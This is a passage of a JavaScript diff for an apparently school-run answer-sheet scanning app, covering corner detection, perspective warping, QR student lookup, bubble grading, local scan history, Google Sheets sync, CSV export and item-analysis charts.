+        name: lastGradedPayload?.name || 'Captured Sheet',
+        score: lastGradedPayload?.score ?? 0,
+        total: lastGradedPayload?.total ?? 0,
+        savedTo: destLabel,
+        timestamp: new Date().toISOString()
+      });
+    }
+
+    if (saveDestinationMode === 'folder' && pickedDirectoryHandle) {
+      try {
+        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.92));
+        const fileHandle = await pickedDirectoryHandle.getFileHandle(filename, { create: true });
+        const writable = await fileHandle.createWritable();
+        await writable.write(blob);
+        await writable.close();
+
+        document.getElementById('driveUploadStatus').textContent =
+          `${isOverwrite ? '♻️ Overwritten' : '✅ Saved'} directly inside folder "${pickedDirectoryHandle.name}/${filename}"!`;
+        return;
+      } catch (e) { /* Fallback to standard download below */ }
+    }
+
+    try {
       const link = document.createElement('a');
-      link.download = `CPGHS_GRADED_${examId}_${lrn}_${ts}.jpg`;
+      link.download = filename;
       link.href = canvas.toDataURL('image/jpeg', 0.92);
       document.body.appendChild(link);
       link.click();
       document.body.removeChild(link);
-      galleryAlreadySavedForCurrentSheet = true;
-      const statusPill = document.getElementById('driveUploadStatus');
-      if (statusPill) {
-        statusPill.textContent = '✅ Graded answer sheet automatically saved to Gallery & Local History!';
-      }
-      return true;
-    } catch (e) {
-      return false;
-    }
-  }
 
-  function saveResultAndDownloadToGallery() {
-    if (typeof saveCurrentPayload === 'function') {
-      saveCurrentPayload(true);
-    }
-    if (!galleryAlreadySavedForCurrentSheet) {
-      if (typeof saveToPhoneGallery === 'function') {
-        saveToPhoneGallery(false);
-        galleryAlreadySavedForCurrentSheet = true;
+      if (saveDestinationMode === 'folder' && folderPath) {
+        const normalizedPath = folderPath.replace(/[\/]+$/, '');
+        const fullTarget = `${normalizedPath}/${filename}`;
+        if (navigator.clipboard && navigator.clipboard.writeText) {
+          navigator.clipboard.writeText(fullTarget).catch(() => {});
+        }
+        document.getElementById('driveUploadStatus').textContent =
+          `${isOverwrite ? '♻️ Overwritten' : '✅ Saved'} for Folder Path:\n${fullTarget}`;
       } else {
-        downloadGradedCanvasToGallery();
+        document.getElementById('driveUploadStatus').textContent =
+          `${isOverwrite ? '♻️ Overwritten' : '✅ Saved'} checked exam sheet to Phone Gallery (${filename})!`;
       }
+    } catch (e) {
+      document.getElementById('driveUploadStatus').textContent = '✅ Graded result recorded in Local History.';
     }
   }
 
-  function saveAndProceedNextCapture() {
-    saveResultAndDownloadToGallery();
-    setTimeout(() => {
-      triggerCameraCapture();
-    }, 350);
+  // =========================================================================
+  // 7. OMR 4-CORNER DETECTION, PERSPECTIVE WARP, QR DECODE & GRADING ENGINE
+  // =========================================================================
+  function detectFourCornerMarkers(canvas) {
+    const w = canvas.width;
+    const h = canvas.height;
+    const defaultCorners = [
+      { x: Math.round(w * 0.08), y: Math.round(h * 0.08) },
+      { x: Math.round(w * 0.92), y: Math.round(h * 0.08) },
+      { x: Math.round(w * 0.92), y: Math.round(h * 0.92) },
+      { x: Math.round(w * 0.08), y: Math.round(h * 0.92) }
+    ];
+
+    if (!cvReady || typeof cv === 'undefined') return { corners: defaultCorners, autoDetected: false };
+
+    try {
+      const src = cv.imread(canvas);
+      const gray = new cv.Mat();
+      const thresh = new cv.Mat();
+      const contours = new cv.MatVector();
+      const hierarchy = new cv.Mat();
+
+      cv.cvtColor(src, gray, cv.COLOR_RGBA2GRAY);
+      cv.GaussianBlur(gray, gray, new cv.Size(5, 5), 0);
+      cv.adaptiveThreshold(gray, thresh, 255, cv.ADAPTIVE_THRESH_GAUSSIAN_C, cv.THRESH_BINARY_INV, 31, 10);
+      cv.findContours(thresh, contours, hierarchy, cv.RETR_EXTERNAL, cv.CHAIN_APPROX_SIMPLE);
+
+      const candidates = [];
+      const minArea = (w * h) * 0.0004;
+      const maxArea = (w * h) * 0.03;
+
+      for (let i = 0; i < contours.size(); i++) {
+        const cnt = contours.get(i);
+        const area = cv.contourArea(cnt);
+        if (area < minArea || area > maxArea) continue;
+        const rect = cv.boundingRect(cnt);
+        const aspect = rect.width / Math.max(1, rect.height);
+        const fillRatio = area / Math.max(1, rect.width * rect.height);
+        if (aspect >= 0.65 && aspect <= 1.45 && fillRatio >= 0.62) {
+          candidates.push({
+            x: rect.x + rect.width / 2,
+            y: rect.y + rect.height / 2,
+            area
+          });
+        }
+      }
+
+      src.delete(); gray.delete(); thresh.delete(); contours.delete(); hierarchy.delete();
+
+      if (candidates.length >= 4) {
+        const pickClosest = (tx, ty) => candidates.reduce((best, c) =>
+          Math.hypot(c.x - tx, c.y - ty) < Math.hypot(best.x - tx, best.y - ty) ? c : best
+        );
+        const tl = pickClosest(0, 0);
+        const tr = pickClosest(w, 0);
+        const br = pickClosest(w, h);
+        const bl = pickClosest(0, h);
+        const unique = new Set([tl, tr, br, bl]);
+        if (unique.size === 4) {
+          return { corners: [tl, tr, br, bl], autoDetected: true };
+        }
+      }
+    } catch (e) { /* Fallback to default corners */ }
+
+    return { corners: defaultCorners, autoDetected: false };
   }
 
-  // =========================================================================
-  // 4. PWA INSTALL & CENTER MODAL HELPERS
-  // =========================================================================
-  let deferredInstallPrompt = null;
-  window.addEventListener('beforeinstallprompt', (e) => {
-    e.preventDefault();
-    deferredInstallPrompt = e;
-  });
+  function warpSheetPerspective(srcCanvas, corners, outW, outH) {
+    const outCanvas = document.createElement('canvas');
+    outCanvas.width = outW;
+    outCanvas.height = outH;
 
-  async function triggerPwaInstall() {
-    if (deferredInstallPrompt) {
-      deferredInstallPrompt.prompt();
-      await deferredInstallPrompt.userChoice;
-      deferredInstallPrompt = null;
+    if (cvReady && typeof cv !== 'undefined') {
+      try {
+        const src = cv.imread(srcCanvas);
+        const dst = new cv.Mat();
+        const srcTri = cv.matFromArray(4, 1, cv.CV_32FC2, [
+          corners[0].x, corners[0].y,
+          corners[1].x, corners[1].y,
+          corners[2].x, corners[2].y,
+          corners[3].x, corners[3].y
+        ]);
+        const dstTri = cv.matFromArray(4, 1, cv.CV_32FC2, [
+          0, 0,
+          outW, 0,
+          outW, outH,
+          0, outH
+        ]);
+        const M = cv.getPerspectiveTransform(srcTri, dstTri);
+        cv.warpPerspective(src, dst, M, new cv.Size(outW, outH));
+        cv.imshow(outCanvas, dst);
+        src.delete(); dst.delete(); srcTri.delete(); dstTri.delete(); M.delete();
+        return outCanvas;
+      } catch (e) { /* Fallback to 2D draw */ }
+    }
+
+    outCanvas.getContext('2d').drawImage(srcCanvas, 0, 0, outW, outH);
+    return outCanvas;
+  }
+
+  function decodeStudentFromQr(canvas) {
+    if (typeof jsQR !== 'function') return null;
+    try {
+      const ctx = canvas.getContext('2d');
+      const imgData = ctx.getImageData(0, 0, canvas.width, Math.round(canvas.height * 0.35));
+      const qr = jsQR(imgData.data, imgData.width, imgData.height);
+      if (qr && qr.data) {
+        const parts = qr.data.split('|');
+        if (parts.length >= 2) {
+          return {
+            lrn: parts[0].trim(),
+            name: parts[1].trim(),
+            section: (parts[2] || '').trim(),
+            gender: (parts[3] || 'N/A').trim()
+          };
+        }
+        return { lrn: qr.data.trim(), name: 'QR Student', section: '', gender: 'N/A' };
+      }
+    } catch (e) { /* Ignore QR errors */ }
+    return null;
+  }
+
+  function processCapturedSheet() {
+    if (!hasLoadedCaptureImage || sourceImageCanvas.width === 0) return;
+
+    const examId = (document.getElementById('examSelect')?.value || '').trim();
+    const mode = document.getElementById('sectionMode')?.value || 'ST1';
+    const savedKeyObj = examId ? getSavedKeys()[examId] : null;
+    const keyArr = savedKeyObj ? savedKeyObj.key : [];
+
+    let autoDetected = false;
+    if (!activeCorners) {
+      const det = detectFourCornerMarkers(sourceImageCanvas);
+      activeCorners = det.corners;
+      autoDetected = det.autoDetected;
+    }
+
+    drawCornerPinOverlay();
+
+    const isTerm = mode === 'TERM';
+    const warpW = isTerm ? 1000 : 750;
+    const warpH = isTerm ? 1400 : 1050;
+    const warped = warpSheetPerspective(sourceImageCanvas, activeCorners, warpW, warpH);
+
+    const qrStudent = decodeStudentFromQr(warped);
+    if (qrStudent) {
+      document.getElementById('studentLrn').value = qrStudent.lrn;
+      document.getElementById('studentName').value = qrStudent.name;
+      document.getElementById('studentSection').value = qrStudent.section;
+      document.getElementById('studentGender').value = qrStudent.gender;
+    }
+
+    const totalItems = isTerm ? 50 : 25;
+    const rowsPerCol = 25;
+    const choices = ['A', 'B', 'C', 'D'];
+
+    const ctx = warped.getContext('2d');
+    const imgData = ctx.getImageData(0, 0, warpW, warpH).data;
+
+    const studentAnswers = [];
+    let score = 0;
+
+    for (let item = 1; item <= totalItems; item++) {
+      const colIdx = Math.floor((item - 1) / rowsPerCol);
+      const rowIdx = (item - 1) % rowsPerCol;
+
+      const colStartX = isTerm ? (colIdx === 0 ? 0.16 : 0.58) : 0.28;
+      const colStepX  = isTerm ? 0.075 : 0.135;
+      const startY    = 0.30;
+      const stepY     = 0.0255;
+      const radius    = Math.round(warpW * (isTerm ? 0.013 : 0.019));
+
+      const cy = Math.round((startY + rowIdx * stepY) * warpH);
+      const darknessScores = choices.map((_, cIdx) => {
+        const cx = Math.round((colStartX + cIdx * colStepX) * warpW);
+        let darkSum = 0;
+        let count = 0;
+        for (let dy = -radius; dy <= radius; dy += 2) {
+          for (let dx = -radius; dx <= radius; dx += 2) {
+            if (dx * dx + dy * dy > radius * radius) continue;
+            const px = Math.min(warpW - 1, Math.max(0, cx + dx));
+            const py = Math.min(warpH - 1, Math.max(0, cy + dy));
+            const offset = (py * warpW + px) * 4;
+            const lum = 0.299 * imgData[offset] + 0.587 * imgData[offset + 1] + 0.114 * imgData[offset + 2];
+            darkSum += (255 - lum);
+            count++;
+          }
+        }
+        return { choiceIdx: cIdx, cx, cy, darkness: darkSum / Math.max(1, count) };
+      });
+
+      const sorted = [...darknessScores].sort((a, b) => b.darkness - a.darkness);
+      const shaded = (sorted[0].darkness - sorted[1].darkness > 14 && sorted[0].darkness > 70)
+        ? choices[sorted[0].choiceIdx]
+        : '';
+
+      studentAnswers.push(shaded);
+      const correctAns = keyArr[item - 1] || '';
+      if (correctAns && shaded === correctAns) score++;
+
+      darknessScores.forEach(b => {
+        const letter = choices[b.choiceIdx];
+        ctx.lineWidth = 3;
+        if (correctAns) {
+          if (shaded === letter && letter === correctAns) {
+            ctx.strokeStyle = '#22c55e';
+            ctx.beginPath(); ctx.arc(b.cx, b.cy, radius + 3, 0, Math.PI * 2); ctx.stroke();
+          } else if (shaded === letter && letter !== correctAns) {
+            ctx.strokeStyle = '#ef4444';
+            ctx.beginPath(); ctx.arc(b.cx, b.cy, radius + 3, 0, Math.PI * 2); ctx.stroke();
+          } else if (letter === correctAns) {
+            ctx.strokeStyle = '#38bdf8';
+            ctx.beginPath(); ctx.arc(b.cx, b.cy, radius + 2, 0, Math.PI * 2); ctx.stroke();
+          }
+        } else if (shaded === letter) {
+          ctx.strokeStyle = '#f59e0b';
+          ctx.beginPath(); ctx.arc(b.cx, b.cy, radius + 3, 0, Math.PI * 2); ctx.stroke();
+        }
+      });
+    }
+
+    ctx.fillStyle = 'rgba(15, 23, 42, 0.88)';
+    ctx.fillRect(0, 0, warpW, 48);
+    ctx.fillStyle = '#ffffff';
+    ctx.font = 'bold 19px Segoe UI, sans-serif';
+    const pct = keyArr.length ? Math.round((score / Math.min(totalItems, keyArr.length)) * 100) : 0;
+    const headerText = keyArr.length
+      ? `CPGHS OMR | ${examId} | Score: ${score}/${Math.min(totalItems, keyArr.length)} (${pct}%)`
+      : `CPGHS OMR | CAPTURED (${totalItems}-Item Sheet) — Set Key in Tab 1`;
+    ctx.fillText(headerText, 16, 31);
+
+    const resultCanvas = document.getElementById('resultCanvas');
+    resultCanvas.width = warpW;
+    resultCanvas.height = warpH;
+    resultCanvas.getContext('2d').drawImage(warped, 0, 0);
+
+    const wrapper = document.getElementById('photoStageWrapper');
+    wrapper.classList.add('active');
+    isCornerPinMode = false;
+    document.getElementById('cornerPinCanvas').style.display = 'none';
+    resultCanvas.style.display = 'block';
+    document.getElementById('toggleViewBtn').textContent = '🎯 Adjust 4 Corners';
+    document.getElementById('reviewControls').classList.add('open');
+
+    const hud = document.getElementById('scanHud');
+    hud.textContent = autoDetected
+      ? '✅ 4 corner squares auto-detected! Choose Phone Gallery or Destination Folder Path below to save.'
+      : '⚠️ Photo captured! Tap "Adjust 4 Corners" if needed, then choose where to save below.';
+
+    const lrnVal = (document.getElementById('studentLrn')?.value || '').trim() || `UNID-${Date.now().toString().slice(-5)}`;
+    const nameVal = (document.getElementById('studentName')?.value || '').trim() || 'Unidentified Student';
+    const secVal = (document.getElementById('studentSection')?.value || '').trim() || 'N/A';
+    const genVal = (document.getElementById('studentGender')?.value || 'N/A').trim();
+
+    const banner = document.getElementById('scoreBanner');
+    banner.classList.add('open');
+    restoreDestinationUiState();
+    document.getElementById('detectedStudentBanner').textContent = `Student: ${nameVal} (${lrnVal})`;
+
+    if (keyArr.length > 0) {
+      banner.classList.remove('no-key');
+      const denom = Math.min(totalItems, keyArr.length);
+      document.getElementById('rapidStatusPill').textContent = '✅ GRADED & READY TO SAVE';
+      document.getElementById('scoreDisplay').textContent = `${score} / ${denom} (${pct}%)`;
+      document.getElementById('scanQualityNote').textContent = `Exam: ${examId} • Format: ${mode}`;
+
+      lastGradedPayload = {
+        id: `${examId}_${lrnVal}`,
+        examId,
+        testType: mode,
+        lrn: lrnVal,
+        name: nameVal,
+        section: secVal,
+        gender: genVal,
+        score,
+        total: denom,
+        percentage: pct,
+        answers: studentAnswers.slice(0, denom),
+        synced: false,
+        savedDestination: saveDestinationMode === 'folder' ? 'Folder Path' : 'Phone Gallery',
+        timestamp: new Date().toISOString()
+      };
     } else {
-      showCenterModal(
-        'Install CPGHS OMR App',
-        'Android (Chrome): Tap the ⋮ menu at the top-right and select "Install app" or "Add to Home screen".\n\niPhone / iPad (Safari): Tap the Share icon (⬆️) at the bottom and choose "Add to Home Screen".',
-        'info'
-      );
+      banner.classList.add('no-key');
+      document.getElementById('rapidStatusPill').textContent = '📷 IMAGE CAPTURED (PREVIEW MODE)';
+      document.getElementById('scoreDisplay').textContent = 'No Key Selected';
+      document.getElementById('scanQualityNote').textContent = 'Set an Answer Key in Tab 1 to compute scores automatically, or save the image now.';
+      lastGradedPayload = null;
     }
   }
 
+  function reanalyzeCapturedImage() {
+    if (!hasLoadedCaptureImage) {
+      showCenterModal('No Image Yet', 'Capture a photo or upload an answer sheet image first.', 'info');
+      return;
+    }
+    processCapturedSheet();
+  }
+
+  // =========================================================================
+  // 8. INTERACTIVE 4-CORNER PIN ADJUSTMENT
+  // =========================================================================
+  function drawCornerPinOverlay() {
+    const pinCanvas = document.getElementById('cornerPinCanvas');
+    pinCanvas.width = sourceImageCanvas.width;
+    pinCanvas.height = sourceImageCanvas.height;
+    const ctx = pinCanvas.getContext('2d');
+    ctx.drawImage(sourceImageCanvas, 0, 0);
+
+    if (!activeCorners) return;
+    ctx.strokeStyle = '#22c55e';
+    ctx.lineWidth = Math.max(3, Math.round(pinCanvas.width * 0.004));
+    ctx.beginPath();
+    ctx.moveTo(activeCorners[0].x, activeCorners[0].y);
+    ctx.lineTo(activeCorners[1].x, activeCorners[1].y);
+    ctx.lineTo(activeCorners[2].x, activeCorners[2].y);
+    ctx.lineTo(activeCorners[3].x, activeCorners[3].y);
+    ctx.closePath();
+    ctx.stroke();
+
+    const r = Math.max(16, Math.round(pinCanvas.width * 0.024));
+    const labels = ['TL', 'TR', 'BR', 'BL'];
+    activeCorners.forEach((pt, idx) => {
+      ctx.fillStyle = 'rgba(239, 68, 68, 0.85)';
+      ctx.beginPath();
+      ctx.arc(pt.x, pt.y, r, 0, Math.PI * 2);
+      ctx.fill();
+      ctx.strokeStyle = '#ffffff';
+      ctx.lineWidth = 3;
+      ctx.stroke();
+
+      ctx.fillStyle = '#ffffff';
+      ctx.font = `bold ${Math.round(r * 0.8)}px sans-serif`;
+      ctx.textAlign = 'center';
+      ctx.textBaseline = 'middle';
+      ctx.fillText(labels[idx], pt.x, pt.y);
+    });
+  }
+
+  function toggleCornerPinView() {
+    if (!hasLoadedCaptureImage) return;
+    isCornerPinMode = !isCornerPinMode;
+    const pinCanvas = document.getElementById('cornerPinCanvas');
+    const resCanvas = document.getElementById('resultCanvas');
+    const btn = document.getElementById('toggleViewBtn');
+    if (isCornerPinMode) {
+      drawCornerPinOverlay();
+      pinCanvas.style.display = 'block';
+      resCanvas.style.display = 'none';
+      btn.textContent = '👁️ View Graded Sheet';
+    } else {
+      pinCanvas.style.display = 'none';
+      resCanvas.style.display = 'block';
+      btn.textContent = '🎯 Adjust 4 Corners';
+    }
+  }
+
+  (function attachCornerDragListeners() {
+    const pinCanvas = document.getElementById('cornerPinCanvas');
+    if (!pinCanvas) return;
+
+    const getCanvasCoords = (evt) => {
+      const rect = pinCanvas.getBoundingClientRect();
+      const clientX = evt.touches ? evt.touches[0].clientX : evt.clientX;
+      const clientY = evt.touches ? evt.touches[0].clientY : evt.clientY;
+      return {
+        x: (clientX - rect.left) * (pinCanvas.width / rect.width),
+        y: (clientY - rect.top) * (pinCanvas.height / rect.height)
+      };
+    };
+
+    const onStart = (evt) => {
+      if (!activeCorners) return;
+      const pos = getCanvasCoords(evt);
+      const hitRadius = Math.max(40, pinCanvas.width * 0.06);
+      let bestIdx = -1;
+      let bestDist = hitRadius;
+      activeCorners.forEach((pt, idx) => {
+        const d = Math.hypot(pt.x - pos.x, pt.y - pos.y);
+        if (d < bestDist) { bestDist = d; bestIdx = idx; }
+      });
+      if (bestIdx !== -1) {
+        draggingCornerIndex = bestIdx;
+        evt.preventDefault();
+      }
+    };
+
+    const onMove = (evt) => {
+      if (draggingCornerIndex === -1 || !activeCorners) return;
+      evt.preventDefault();
+      const pos = getCanvasCoords(evt);
+      activeCorners[draggingCornerIndex] = {
+        x: Math.max(0, Math.min(pinCanvas.width, pos.x)),
+        y: Math.max(0, Math.min(pinCanvas.height, pos.y))
+      };
+      drawCornerPinOverlay();
+    };
+
+    const onEnd = () => { draggingCornerIndex = -1; };
+
+    pinCanvas.addEventListener('mousedown', onStart);
+    pinCanvas.addEventListener('mousemove', onMove);
+    window.addEventListener('mouseup', onEnd);
+    pinCanvas.addEventListener('touchstart', onStart, { passive: false });
+    pinCanvas.addEventListener('touchmove', onMove, { passive: false });
+    window.addEventListener('touchend', onEnd);
+  })();
+
+  // =========================================================================
+  // 9. LOCAL SCAN HISTORY & GOOGLE SHEETS SYNC
+  // =========================================================================
+  function getScanHistory() {
+    try { return JSON.parse(localStorage.getItem(LS_SCAN_HISTORY) || '[]'); }
+    catch (e) { return []; }
+  }
+
+  function saveScanHistory(arr) {
+    localStorage.setItem(LS_SCAN_HISTORY, JSON.stringify(arr));
+    renderScanHistoryTable();
+  }
+
+  function upsertScanRecord(payload) {
+    const history = getScanHistory();
+    const idx = history.findIndex(r => r.id === payload.id || (payload.imageHash && r.imageHash === payload.imageHash));
+    if (idx !== -1) history[idx] = payload;
+    else history.unshift(payload);
+    saveScanHistory(history);
+  }
+
+  function renderScanHistoryTable() {
+    const tbody = document.querySelector('#scanHistoryTable tbody');
+    if (!tbody) return;
+    const selectedExam = (document.getElementById('examSelect')?.value || '').trim();
+    document.getElementById('historyExamLabel').textContent = selectedExam || 'All Exams';
+
+    const all = getScanHistory();
+    const pendingCount = all.filter(r => !r.synced).length;
+    document.getElementById('pendingBtnCount').textContent = pendingCount;
+
+    const rows = selectedExam ? all.filter(r => r.examId === selectedExam) : all;
+    tbody.innerHTML = rows.length === 0
+      ? '<tr><td colspan="7" style="text-align:center; color:#64748b; padding:12px;">No captured sheets saved yet.</td></tr>'
+      : rows.map((r, i) => `
+        <tr>
+          <td>${i + 1}</td>
+          <td>${r.lrn}</td>
+          <td>${r.name}</td>
+          <td>${r.examId}</td>
+          <td><strong>${r.score}/${r.total}</strong> (${r.percentage}%)</td>
+          <td style="font-size:10.5px;">${r.savedDestination || 'Gallery'}</td>
+          <td><button type="button" class="btn-danger btn-sm" style="padding:3px 7px;" onclick="deleteScanRecord('${r.id}')">✕</button></td>
+        </tr>
+      `).join('');
+  }
+
+  function deleteScanRecord(id) {
+    const history = getScanHistory();
+    const target = history.find(r => r.id === id);
+    if (target && target.imageHash) {
+      const hashes = getSavedImageHashes();
+      delete hashes[target.imageHash];
+      localStorage.setItem(LS_SAVED_HASHES, JSON.stringify(hashes));
+    }
+    saveScanHistory(history.filter(r => r.id !== id));
+  }
+
+  function clearLocalScanHistory() {
+    if (confirm('Clear all local scan history and duplicate image registry on this device?')) {
+      localStorage.removeItem(LS_SAVED_HASHES);
+      saveScanHistory([]);
+    }
+  }
+
+  async function saveGasUrl() {
+    const url = (document.getElementById('gasUrlInput')?.value || '').trim();
+    localStorage.setItem(LS_GAS_URL, url);
+    if (!url) {
+      showCenterModal('Saved Offline Mode', 'Google Apps Script URL cleared. App will store all scans locally.', 'info');
+      return;
+    }
+    try {
+      const res = await fetch(`${url}?action=getInitialData`);
+      const data = await res.json();
+      if (data && data.examKeys) {
+        const merged = { ...getSavedKeys(), ...data.examKeys };
+        localStorage.setItem(LS_EXAM_KEYS, JSON.stringify(merged));
+        restoreAllExamIdDropdowns();
+      }
+      showCenterModal('Connected!', 'Successfully connected to Google Apps Script backend.', 'success');
+    } catch (e) {
+      showCenterModal('URL Saved', 'URL saved. Sync will retry when online.', 'warning');
+    }
+  }
+
+  async function syncAllPendingScans() {
+    const gasUrl = (localStorage.getItem(LS_GAS_URL) || '').trim();
+    if (!gasUrl) {
+      showCenterModal('Backend URL Not Set', 'Open Tab 4 (Setup) to enter your Google Apps Script Web App URL, or export CSV directly.', 'warning');
+      return;
+    }
+    const history = getScanHistory();
+    const pending = history.filter(r => !r.synced);
+    if (pending.length === 0) {
+      showCenterModal('All Synced', 'Every local scan is already synced to Google Sheets.', 'success');
+      return;
+    }
+    try {
+      await fetch(gasUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'text/plain;charset=utf-8' },
+        body: JSON.stringify({ action: 'syncBatchResults', results: pending })
+      });
+      history.forEach(r => { r.synced = true; });
+      saveScanHistory(history);
+      showCenterModal('Sync Complete', `Synced ${pending.length} scan record(s) to Google Sheets.`, 'success');
+    } catch (e) {
+      showCenterModal('Sync Failed', 'Could not reach Google Apps Script. Your scans remain safe locally.', 'danger');
+    }
+  }
+
+  function exportLocalHistoryCsv() {
+    const selectedExam = (document.getElementById('examSelect')?.value || '').trim();
+    const all = getScanHistory();
+    const rows = selectedExam ? all.filter(r => r.examId === selectedExam) : all;
+    if (rows.length === 0) {
+      showCenterModal('No Data', 'No scan records available to export.', 'info');
+      return;
+    }
+    const headers = ['LRN', 'Student Name', 'Section', 'Gender', 'Exam ID', 'Score', 'Total', 'Percentage', 'Saved Destination', 'Timestamp'];
+    const csvLines = [headers.join(',')];
+    rows.forEach(r => {
+      csvLines.push([
+        `"${r.lrn}"`, `"${r.name}"`, `"${r.section}"`, `"${r.gender}"`,
+        `"${r.examId}"`, r.score, r.total, `${r.percentage}%`,
+        `"${r.savedDestination || 'Phone Gallery'}"`, `"${r.timestamp}"`
+      ].join(','));
+    });
+    downloadCsvFile(csvLines.join('\n'), `CPGHS_OMR_History_${selectedExam || 'ALL'}.csv`);
+  }
+
+  function downloadCsvFile(csvText, filename) {
+    const blob = new Blob([csvText], { type: 'text/csv;charset=utf-8;' });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = filename;
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    URL.revokeObjectURL(url);
+  }
+
+  // =========================================================================
+  // 10. ITEM ANALYSIS, COMPETENCY MASTERY & RANKING ANALYTICS
+  // =========================================================================
+  function filterAnalyticsExams(type, btn) {
+    analyticsTypeFilter = type;
+    document.querySelectorAll('.exam-type-pill').forEach(p => {
+      p.className = p === btn ? 'btn-primary btn-sm exam-type-pill' : 'btn-outline btn-sm exam-type-pill';
+    });
+    const sel = document.getElementById('analyticsExamSelect');
+    Array.from(sel.options).forEach(opt => {
+      if (!opt.value) return;
+      opt.hidden = (type !== 'ALL' && !opt.value.endsWith('-' + type));
+    });
+    loadAnalytics();
+  }
+
+  function loadAnalytics() {
+    const examId = (document.getElementById('analyticsExamSelect')?.value || '').trim();
+    const allScans = getScanHistory();
+    const savedKeys = getSavedKeys();
+
+    const termBody = document.querySelector('#termCompareTable tbody');
+    if (termBody) {
+      const grouped = {};
+      allScans.forEach(s => {
+        if (!grouped[s.examId]) grouped[s.examId] = [];
+        grouped[s.examId].push(s);
+      });
+      const examIds = Object.keys(grouped);
+      termBody.innerHTML = examIds.length === 0
+        ? '<tr><td colspan="7" style="text-align:center; color:#64748b;">No recorded exams yet.</td></tr>'
+        : examIds.map(id => {
+            const list = grouped[id];
+            const mps = (list.reduce((a, b) => a + b.percentage, 0) / list.length).toFixed(1);
+            const passing = list.filter(x => x.percentage >= 75).length;
+            const scores = list.map(x => x.score);
+            return `<tr>
+              <td>${id.split('-').pop()}</td>
+              <td><strong>${id}</strong></td>
+              <td>${list[0].total}</td>
+              <td>${list.length}</td>
+              <td>${mps}%</td>
+              <td>${passing}/${list.length}</td>
+              <td>${Math.max(...scores)} / ${Math.min(...scores)}</td>
+            </tr>`;
+          }).join('');
+    }
+
+    const scans = examId ? allScans.filter(s => s.examId === examId) : [];
+    document.getElementById('iaExamHeaderBadge').textContent = examId || 'Selected Exam';
+    document.getElementById('activeExamMetaBanner').textContent = examId
+      ? `Active Report: ${examId} • ${scans.length} Examinee(s)`
+      : 'Active Report: Select an Exam ID above';
+
+    if (scans.length === 0) {
+      document.getElementById('kpiStudents').textContent = '0';
+      document.getElementById('kpiMps').textContent = '0%';
+      document.getElementById('kpiHigh').textContent = '0';
+      document.getElementById('kpiLow').textContent = '0';
+      document.querySelector('#itemTable tbody').innerHTML = '';
+      document.querySelector('#tosTable tbody').innerHTML = '';
+      document.querySelector('#rankingTable tbody').innerHTML = '';
+      return;
+    }
+
+    const scores = scans.map(s => s.score);
+    const mps = (scans.reduce((a, b) => a + b.percentage, 0) / scans.length).toFixed(1);
+    document.getElementById('kpiStudents').textContent = scans.length;
+    document.getElementById('kpiMps').textContent = `${mps}%`;
+    document.getElementById('kpiHigh').textContent = Math.max(...scores);
+    document.getElementById('kpiLow').textContent = Math.min(...scores);
+
+    const keyObj = savedKeys[examId] || { key: [], competencies: [] };
+    const totalItems = keyObj.key.length || scans[0].total;
+    const sortedScans = [...scans].sort((a, b) => b.score - a.score);
+    const groupSize = Math.max(1, Math.round(sortedScans.length * 0.27));
+    const upperGroup = sortedScans.slice(0, groupSize);
+    const lowerGroup = sortedScans.slice(-groupSize);
+
+    const itemStats = [];
+    for (let i = 0; i < totalItems; i++) {
+      const correctAns = keyObj.key[i] || '';
+      const correctCount = scans.filter(s => (s.answers?.[i] || '') === correctAns && correctAns !== '').length;
+      const wrongCount = scans.length - correctCount;
+      const p = correctCount / scans.length;
+      const upperP = upperGroup.filter(s => (s.answers?.[i] || '') === correctAns).length / upperGroup.length;
+      const lowerP = lowerGroup.filter(s => (s.answers?.[i] || '') === correctAns).length / lowerGroup.length;
+      const d = upperP - lowerP;
+      const level = p >= 0.75 ? 'Easy' : (p >= 0.30 ? 'Average' : 'Difficult');
+      const decision = d >= 0.20 ? 'Retain' : (d >= 0.10 ? 'Revise' : 'Discard / Review');
+      itemStats.push({ item: i + 1, correctCount, wrongCount, mastery: Math.round(p * 100), p: p.toFixed(2), level, d: d.toFixed(2), decision });
+    }
+
+    document.querySelector('#itemTable tbody').innerHTML = itemStats.map(st => `
+      <tr>
+        <td><strong>#${st.item}</strong></td>
+        <td>${st.correctCount}</td>
+        <td>${st.wrongCount}</td>
+        <td>${st.mastery}%</td>
+        <td>${st.p}</td>
+        <td>${st.level}</td>
+        <td>${st.d}</td>
+        <td>${st.decision}</td>
+      </tr>
+    `).join('');
+
+    const compStats = (keyObj.competencies || []).map(c => {
+      const validItems = (c.items || []).filter(n => n >= 1 && n <= totalItems);
+      const avgMastery = validItems.length
+        ? Math.round(validItems.reduce((sum, n) => sum + (itemStats[n - 1]?.mastery || 0), 0) / validItems.length)
+        : 0;
+      return {
+        code: c.code,
+        description: c.description,
+        items: validItems.join(', '),
+        mastery: avgMastery,
+        status: avgMastery >= 75 ? 'Mastered' : (avgMastery >= 50 ? 'Nearing Mastery' : 'Least Mastered')
+      };
+    }).sort((a, b) => a.mastery - b.mastery);
+
+    document.querySelector('#tosTable tbody').innerHTML = compStats.map((c, idx) => `
+      <tr>
+        <td>${idx + 1}</td>
+        <td><strong>${c.code}</strong></td>
+        <td>${c.description}</td>
+        <td>${c.items}</td>
+        <td>${c.mastery}%</td>
+        <td>${c.status}</td>
+      </tr>
+    `).join('');
+
+    document.querySelector('#rankingTable tbody').innerHTML = sortedScans.map((s, idx) => `
+      <tr>
+        <td><strong>${idx + 1}</strong></td>
+        <td>${s.lrn}</td>
+        <td>${s.name}</td>
+        <td>${s.section}</td>
+        <td>${s.gender}</td>
+        <td><strong>${s.score}/${s.total}</strong></td>
+        <td>${s.percentage}%</td>
+      </tr>
+    `).join('');
+
+    renderAnalyticsCharts(itemStats, compStats, sortedScans);
+  }
+
+  function renderAnalyticsCharts(itemStats, compStats, sortedScans) {
+    ['itemChart', 'competencyChart', 'rankingChart'].forEach(id => {
+      if (chartInstances[id]) chartInstances[id].destroy();
+    });
+
+    const itemCtx = document.getElementById('itemChart');
+    if (itemCtx) {
+      chartInstances.itemChart = new Chart(itemCtx, {
+        type: 'bar',
+        data: {
+          labels: itemStats.map(s => `#${s.item}`),
+          datasets: [{ label: 'Mastery %', data: itemStats.map(s => s.mastery), backgroundColor: '#2563eb' }]
+        },
+        options: { scales: { y: { beginAtZero: true, max: 100 } } }
+      });
+    }
+
